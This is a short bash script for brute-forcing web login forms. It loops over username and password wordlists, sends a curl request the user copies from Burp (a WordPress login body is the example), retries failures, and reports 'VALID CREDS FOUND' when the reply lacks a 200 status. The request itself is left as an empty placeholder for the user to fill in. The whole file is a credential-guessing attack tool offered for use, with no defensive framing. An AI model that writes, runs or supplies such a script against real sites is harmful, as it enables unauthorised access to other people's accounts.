#!/usr/bin/env bash

main(){
        #copy curl command from burp and add the following switches for curl: 
        #       --silent
        #       --insecure
        #       -m <timeout period> ==> recommended 10
        #       -o /dev/null
        #       -w "%{http_code}" ==> optional, do your research on the replies and act as follows.
        #
        #the request for example:
        #       'log=admin'${user}'&pwd='${pass}'&wp-submit=Log'
 
        #put the curl request between ()
        cmd=$()

        return $?

}




user_file=$1
pass_file=$2

while read user_line;do
        user=$user_line
        while read pass_line;do
                pass=$pass_line
                echo "[ATTEMPT] ${user}:${pass}"
                main
                until [[ $? -eq 0 ]];do
                        echo "[RE-ATTEMPT] ${user}:${pass}"
                        main
                done

                #do your research on the valid resopnse you want to receive and tweak the following lines..

		echo $cmd | grep -e "200" 1> /dev/null 2>&1
                if [[ $? -eq 0 ]];then continue;else echo "[+] VALID CREDS FOUND ===> ${user}:${pass}";exit 0;fi

        done < "${pass_file}"
done < "${user_file}"


